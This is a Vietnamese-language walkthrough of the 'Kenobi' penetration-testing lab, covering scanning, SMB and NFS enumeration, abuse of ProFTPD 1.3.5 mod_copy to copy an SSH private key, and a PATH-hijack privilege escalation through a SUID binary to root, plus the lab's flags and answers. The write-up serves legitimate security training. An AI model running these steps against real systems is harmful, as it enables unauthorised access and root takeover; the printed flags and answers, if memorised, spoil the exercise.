![image](https://github.com/user-attachments/assets/280bee4d-19d6-4de5-93b3-9c0cd9b49533)
# Room info and Comment
## Room info
Phòng này sẽ bao gồm việc truy cập vào chia sẻ Samba, thao túng phiên bản dễ bị tổn thương của **proftpd** để có quyền truy cập ban đầu và nâng cao đặc quyền của bạn để root thông qua tệp nhị phân **SUID**.

## Comment
Bài lab này khá dễ vì để lộ những lỗ hổng mà chức thực tế chả bao giờ xảy ra =)), mà cũng có thêm 1 số bước học hỏi hay

# Analysis
## nmap
Scan để xem có những port và service gì
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -n 10.10.169.181
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 03:10 EDT
Nmap scan report for 10.10.169.181
Host is up (0.21s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.27 seconds
```
## smbclients
Vì bài lab này tập trung 1 phần vào khai thác SMB và từ hint của đã cho ta ta dùng tool này để liệt kê các shares
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.169.181


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI
```
Sau đó truy cập vào `anonymous` xem có gì không
```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.169.181/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877116 blocks available

smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (14.0 KiloBytes/sec) (average 14.0 KiloBytes/sec)
```
Mở file `log.txt`. Có một vài điều thú vị được tìm thấy:
- Thông tin được tạo cho Kenobi khi tạo khóa SSH cho người dùng
- Thông tin về máy chủ ProFTPD

![image](https://github.com/user-attachments/assets/a6621299-8e7f-489d-99d4-4da1edd4ab60)

Quá trình quét cổng nmap trước đó của mình hiển thị port 111 đang chạy dịch vụ **rpcbind**. Đây chỉ là một máy chủ chuyển đổi số chương trình cuộc gọi thủ tục từ xa (RPC) thành địa chỉ chung. Khi một dịch vụ RPC được khởi động, nó sẽ thông báo cho **rpcbind** địa chỉ mà nó đang nghe và số chương trình RPC mà nó chuẩn bị phục vụ. 

Trong trường hợp của chúng ta, port 111 là quyền truy cập vào hệ thống tệp mạng. Hãy sử dụng nmap để liệt kê điều này.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap --script nfs*  10.10.169.181 -sV -p111
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 03:26 EDT
Nmap scan report for 10.10.169.181
Host is up (0.22s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      39818/udp   mountd
|   100005  1,2,3      51413/tcp6  mountd
|   100005  1,2,3      52425/tcp   mountd
|   100005  1,2,3      60501/udp6  mountd
|   100021  1,3,4      35680/udp   nlockmgr
|   100021  1,3,4      41521/tcp   nlockmgr
|   100021  1,3,4      42535/tcp6  nlockmgr
|   100021  1,3,4      45410/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836516.0  6877112.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
```
## ftp, nc, exploitdb
Như đã biết ở trên có 1 port 21 sử dụng ftp. Bây giờ ta dựa vào hint của bài lab sử dụng **nc** để lấy banner mục tiêu nhắm đến version khai thác nó
```
┌──(kali㉿kali)-[~]
└─$ nc 10.10.169.181 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.169.181]
```
Sau khi có version truy cập [exploit-db](https://www.exploit-db.com/) xem có bao nhiêu bản khai thác

![image](https://github.com/user-attachments/assets/9481d603-498c-43ae-aa07-f34041520693)

Vì bài lab yêu cầu sử dụng **ProFtpd's mod_copy module** để khai thác nên ta sẽ áp dụng

Mô-đun mod_copy thực hiện các lệnh **SITE CPFR** và **SITE CPTO**, có thể được sử dụng để sao chép các tập tin/thư mục từ nơi này sang nơi khác trên máy chủ. Bất kỳ ứng dụng khách chưa được xác thực nào cũng có thể tận dụng các lệnh này để sao chép tệp từ bất kỳ phần nào của hệ thống tệp tới đích đã chọn.

Chúng ta biết rằng dịch vụ FTP đang chạy với tư cách là người dùng **Kenobi** (từ tệp trên phần chia sẻ) và **khóa ssh** được tạo cho người dùng đó. 

Bây giờ chúng ta sẽ sao chép **private key** của Kenobi bằng các lệnh **SITE CPFR** và **SITE CPTO**.

![image](https://github.com/user-attachments/assets/334207e2-5826-4e1b-a7c2-2501b84b3179)

Chúng ta biết rằng thư mục `/var` là một mount mà chúng ta có thể thấy từ các phân tích trên. Vì vậy, bây giờ chúng ta đã chuyển **private key** của Kenobi sang thư mục `/var/tmp`.

## mount
Sau khi đã chuyển về `/var/tmp` ta tiếp tục chuyển về máy attack của chúng ta

```
┌──(kali㉿kali)-[~]
└─$ sudo mount 10.10.169.181:/var .
[sudo] password for kali: 
   
┌──(kali㉿kali)-[~]
└─$ ls -la ./tmp 
total 28
drwxrwxrwt  6 root root 4096 Jul 29 03:43 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
-rw-r--r--  1 kali kali 1675 Jul 29 03:43 id_rsa
drwx------  3 root root 4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM                                                                                               
drwx------  3 root root 4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw                                                                                               
drwx------  3 root root 4096 Jul 29 03:03 systemd-private-b646fe2249974d4e86151803caa0fbb1-systemd-timesyncd.service-9ilJJi                                                                                               
drwx------  3 root root 4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn  
```
## SSH 
Sau khi có file private key ta tiến hành login
```
┌──(kali㉿kali)-[~/tmp]
└─$ sudo ssh -i id_rsa kenobi@10.10.169.181
The authenticity of host '10.10.169.181 (10.10.169.181)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.169.181' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ cat /home/kenobi/user.txt 
d0b0f3f53b6caa532a83915e19224899
```
## SUID 
Chạy file và thấy được có `/usr/bin/menu` đặc biệt và có thể khai thác không bị deny
```
find / -type f -perm -04000 -ls 2>/dev/null
```
Chạy xem nó hiển thị gì
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Mon, 29 Jul 2024 08:08:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

Sau khi chạy 3 options ta nhận ra Strings là lệnh trên Linux tìm kiếm các chuỗi mà con người có thể đọc được trên tệp nhị phân. Điều này cho chúng ta thấy tệp nhị phân đang chạy mà không có đường dẫn đầy đủ (ví dụ: không sử dụng /usr/bin/curl hoặc /usr/bin/uname).

Từ đây ta có thể lợi dụng để tạo ra một **rootshell**. Nhưng trước tiên phải cd vào `/tmp` thì mới chạy được lệnh tạo rootshell
```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# ls
curl  systemd-private-b646fe2249974d4e86151803caa0fbb1-systemd-timesyncd.service-xtcAlM
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

# Results
1. Scan the machine with nmap, how many ports are open? --> 7
2. Using the nmap command above, how many shares have been found? --> 3
3. Once you're connected, list the files on the share. What is the file can you see? --> log.txt
4. What port is FTP running on? --> 21
5. What mount can we see? --> /var
6. What is the version? --> 1.3.5
7. How many exploits are there for the ProFTPd running? --> 4
8. What is Kenobi's user flag (/home/kenobi/user.txt)? --> d0b0f3f53b6caa532a83915e19224899
9. What file looks particularly out of the ordinary?  --> /usr/bin/menu
10. Run the binary, how many options appear? --> 3
11. What is the root flag (/root/root.txt)? --> 177b3cd8562289f37382721c28381f02
